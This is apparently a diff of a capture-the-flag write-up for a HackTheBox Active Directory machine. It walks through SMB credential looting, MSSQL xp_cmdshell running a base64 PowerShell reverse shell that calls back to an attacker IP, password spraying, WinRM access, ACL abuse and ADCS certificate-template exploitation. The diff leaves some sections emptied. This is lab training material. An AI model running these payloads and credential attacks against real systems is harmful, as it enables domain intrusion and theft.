@@ -38,6 +38,33 @@ echo -e "rose\nKxEPkKe6R8su" > creds.txt
 
 ```bash
 sudo nmap -p- --min-rate 10000 -sCV -Pn -oN enum.nmap 10.10.11.51
+
+# Nmap 7.94SVN scan initiated Fri Jun 13 12:43:24 2025 as: nmap -sC -sV -p- -Pn -oN enum.nmap 10.10.11.51
+Nmap scan report for 10.10.11.51
+Host is up (0.020s latency).
+Not shown: 65510 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-13 16:45:30Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664–49743/tcp open  msrpc   Microsoft Windows RPC
+
+Then added this to /etc/hosts:
+
+10.10.11.51 DC01.sequel.htb sequel.htb DC01
+
 ```
 
 ## 🧪 Protocol Enumeration (NetExec)
@@ -61,13 +88,40 @@ Result:
 SMB 10.10.11.51 445 DC01 [+] sequel.htb\rose:KxEPkKe6R8su
 ```
 
-## 📁 SMB Share Access
+## 📁 SMB Share Enumeration & File retrieval
 
 ```bash
+
+Option 1: Using netexec and smbclient
+
 netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
 smbclient '//dc01.sequel.htb/Accounting Department' -U rose%KxEPkKe6R8su
 prompt off
 mget *
+
+OR use option 2: impacket-smbclient
+
+impacket-smbclient SEQUEL.HTB/rose:KxEPkKe6R8su@dc01.sequel.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# shares
+Accounting Department
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+Users
+# use Accounting Department
+# ls
+drw-rw-rw-          0  Sun Jun  9 07:11:31 2024 .
+drw-rw-rw-          0  Sun Jun  9 07:11:31 2024 ..
+-rw-rw-rw-      10217  Sun Jun  9 07:11:31 2024 accounting_2024.xlsx
+-rw-rw-rw-       6780  Sun Jun  9 07:11:31 2024 accounts.xlsx
+# get accounting_2024.xlsx
+# get accounts.xlsx
+
 ```
 
 Discovered: `accounts.xlsx`
@@ -78,7 +132,6 @@ Discovered: `accounts.xlsx`
 
 cat accounts/xl/sharedStrings.xml | xmllint --xpath '//*[local-name()="t"]/text()' - | awk 'ORS=NR%5?",":"\n"' > userpass.txt
 
-
 cat user.txt
 angela
 oscar
@@ -86,6 +139,7 @@ kevin
 sa
 
 cat passwords.txt
+
 0fwz7Q4mSpurIt99
 86LxLBMgEWaKUnBG
 Md9Wlq1E5bZnVDVo
@@ -149,40 +203,214 @@ On MSSQL:
 xp_cmdshell powershell -e JABzAD0AJwAxADAALgAxADAALgAxADQALgAxADIAOgA4ADAAOAAwACcAOwAkAGkAPQAnAGIAZAAxADIAOABlAGUANgAtAGYANQBkADQANgAzAGYAZQAtAGIAYwA5ADIAZgBiADEAMwAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBiAGQAMQAyADgAZQBlADYAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANgBjADIAYgAtAGIANQAyADQAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA1AGQANAA2ADMAZgBlACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvAGIAYwA5ADIAZgBiADEAMwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=
 ```
 
-## 🧠 AD Recon (BloodHound)
+```sql
+got shell as sql_svc
+
+After extracting potential usernames and passwords from accounts.xlsx, I used netexec to validate access against the MSSQL service. The credentials were tested using the following command:
+
+nxc mssql sequel.htb -u users -p passwords --no-bruteforce --local-auth --continue-on-success
+
+Results:
+
+MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+MSSQL       10.10.11.51     1433   DC01             [-] DC01\angela:0fwz7Q4mSpurIt99 (Login failed for user 'angela'. Please try again with or without '--local-auth')
+MSSQL       10.10.11.51     1433   DC01             [-] DC01\oscar:86LxLBMgEWaKUnBG (Login failed for user 'oscar'. Please try again with or without '--local-auth')
+MSSQL       10.10.11.51     1433   DC01             [-] DC01\kevin:Md9Wlq1E5bZnVDVo (Login failed for user 'kevin'. Please try again with or without '--local-auth')
+MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+
+The sa (SQL Server Administrator) account was valid and provided elevated access.
+
+To confirm the context and leverage command execution, I used the following:
+
+netexec mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami
+MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
+MSSQL       10.10.11.51     1433   DC01             sequel\sql_svc
+
+This confirmed that I had command execution as the sql_svc service account 
+```
+
+```sql
+
+Reverse Shell via xp_cmdshell and HoaxShell
+
+With xp_cmdshell enabled on the SQL Server, I used [HoaxShell](https://github.com/t3l3machus/hoaxshell){:target="_blank"} to establish a stable reverse shell.
+
+Step 1: Start the HoaxShell Listener
+
+sudo python3 hoaxshell.py -s 10.10.14.12
+
+
+    ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬   ┬  
+    ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤  │   │  
+    ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘
+                           by t3l3machus
+
+[Info] Generating reverse shell payload...
+powershell -e JABzAD0AJwAxADAALgAxADAALgAxADQALgAxADIAOgA4ADAAOAAwACcAOwAkAGkAPQAnAGIAZAAxADIAOABlAGUANgAtAGYANQBkADQANgAzAGYAZQAtAGIAYwA5ADIAZgBiADEAMwAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBiAGQAMQAyADgAZQBlADYAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANgBjADIAYgAtAGIANQAyADQAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA1AGQANAA2ADMAZgBlACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvAGIAYwA5ADIAZgBiADEAMwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=
+Copied to clipboard!
+[Info] Type "help" to get a list of the available prompt commands.
+[Info] Http Server started on port 8080.
+[Important] Awaiting payload execution to initiate shell session...
+[Shell] Payload execution verified!
+[Shell] Stabilizing command prompt...
+
+PS C:\Windows\system32 > whoami
+sequel\sql_svc
+
+PS C:\Windows\system32 > whoami
+sequel\sql_svc
+
+After exploring the system, I located the SQL Server installation directory and dumped the configuration file, which revealed plaintext credentials:
+
+Get-Content "C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"
+
+Notable entries:
+
+PS C:\SQL2019\ExpressAdv_ENU > Get-Content sql-Configuration.INI
+[OPTIONS]
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+SECURITYMODE="SQL"
+SAPWD="MSSQLP@ssw0rd!"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+
+C:\SQL2019>type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI | findstr /i password
+
+type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI | findstr /i password
+SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+
+```
+
+
+## AD Recon 
 
 ```bash
 ldapdomaindump ldap://dc01.sequel.htb -u sequel.htb\\rose -p 'KxEPkKe6R8su'
 bloodhound-python -u rose -p 'KxEPkKe6R8su' -d sequel.htb -c all
+
+With valid domain credentials for rose, I enumerated users via LDAP and attempted lateral movement by testing reused passwords across services.
+
+Step 1: Dump All Domain Users via LDAP
+
+nxc ldap dc01.sequel.htb -u rose -p 'KxEPkKe6R8su' --users-export users.txt
+
+This successfully authenticated as rose and enumerated 9 domain users, exporting them to users.txt:
+
+Administrator
+Guest
+krbtgt
+michael
+ryan
+oscar
+sql_svc
+rose
+ca_svc
+
+Step 2: Password Spray with Recovered Password
+
+Previously, we dumped the password for sql_svc from the SQL configuration file:
+WqSZAF6CysDQbGb3
+
+I now tested this password against all users via SMB:
+
+nxc smb dc01.sequel.htb -u users.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success
+
+Results:
+
+    ❌ Most accounts failed authentication
+
+    ✅ ryan and sql_svc successfully authenticated using the same password!
+
+Step 3: Remote Code Execution via WinRM
+
+Since ryan accepted the password and was likely a standard user, I tested WinRM access:
+
+nxc winrm sequel.htb -u ryan -p WqSZAF6CysDQbGb3
+
+WINRM [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
+
+✅ Success! The user ryan is a member of the Remote Management Users group, allowing me to get a shell via evil-winrm and retrieve the first flag:
+
+evil-winrm -i dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
+
+This flow shows how a single credential reused across services and accounts enabled privilege chaining — from SQL config leakage to LDAP enumeration, SMB spraying, and finally WinRM shell access.
+
 ```
 
 PowerShell check for ACL:
 
 ```powershell
+
+After confirming that ryan had WinRM access:
+
+evil-winrm -i dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
+
+I initiated a PowerShell query to enumerate Ryan's permissions on Active Directory objects, specifically looking for dangerous rights like WriteOwner, GenericAll, or GenericWrite:
+
 $u="SEQUEL\ryan";Get-ADUser -Filter *|%{$dn="AD:$($_.DistinguishedName)";$a=Get-Acl $dn;$h=$a.Access|?{$_.IdentityReference -eq $u -and $_.ActiveDirectoryRights -match 'WriteOwner|GenericAll|GenericWrite|All'};if($h){Write-Host "User: $($_.Name)" -ForegroundColor Cyan;$h|fl;Write-Host "-----" -ForegroundColor DarkGray}}
+
+Ryan had WriteOwner rights over the Certification Authority object.
+
+This permission enables a user to change the ownership of the targeted object — which in Active Directory can open the door to full control, allowing for privilege escalation via manipulation of access control or delegation paths.
+
 ```
 
 ## 🏗️ Takeover ca_svc via ACL Abuse
 
 ```bash
-impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
-impacket-dacledit -action write -rights FullControl -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
-net rpc password "ca_svc" "w1ldP@ssword2022" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "sequel.htb"
+
 ```
 
 ## ⚙️ ADCS Abuse (ESC1 / ESC4)
 
 ```bash
-certipy-ad find -u ca_svc -p w1ldP@ssword2022 -dc-ip 10.10.11.51 -vulnerable
-certipy-ad template -template DunderMifflinAuthentication -u ca_svc -p 'w1ldP@ssword2022' -dc-ip 10.10.11.51
-certipy-ad req -u ca_svc -p w1ldP@ssword2022 -target sequel.htb -dns sequel.htb -ca sequel-dc01-ca -upn Administrator -template DunderMifflinAuthentication
-```
+Using certipy, I began enumerating the environment for vulnerable certificate templates:
 
-## 🔐 Use Certificate to Authenticate & Dump Hashes
+certipy-ad find -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
 
-```bash
-certipy-ad auth -pfx administrator_sequel.pfx -username Administrator -domain sequel.htb
-secretsdump.py -k -no-pass -just-dc sequel.htb/Administrator@sequel.htb
+From the output, one particularly interesting certificate template stood out:
+
+Template Name            : DunderMifflinAuthentication
+Enabled                  : True
+Enrollment Rights        : SEQUEL.HTB\Domain Admins, SEQUEL.HTB\Enterprise Admins
+Full Control Principals  : SEQUEL.HTB\Cert Publishers
+Write Owner Principals   : SEQUEL.HTB\Cert Publishers
+Write Dacl Principals    : SEQUEL.HTB\Cert Publishers
+Write Property Enroll    : SEQUEL.HTB\Cert Publishers
+
+The DunderMifflinAuthentication template is enabled, allows for Client Authentication, and has autoenrollment enabled. While enrollment is limited to high-privileged groups like Domain Admins, control permissions are delegated to the Cert Publishers group.
+
+Since I had already compromised the ca_svc account — which is a member of Cert Publishers — I was in a position to:
+
+- Take ownership of the template
+- Modify its permissions (e.g., add Enroll rights for another user I control)
+- Request a certificate and authenticate as a domain admin
+
+This control over the template made it a viable target for ESC4 abuse (Certificate Template Permissions) using certipy.
+
 ```
 
 ## 🪟 Admin Shell (WinRM)
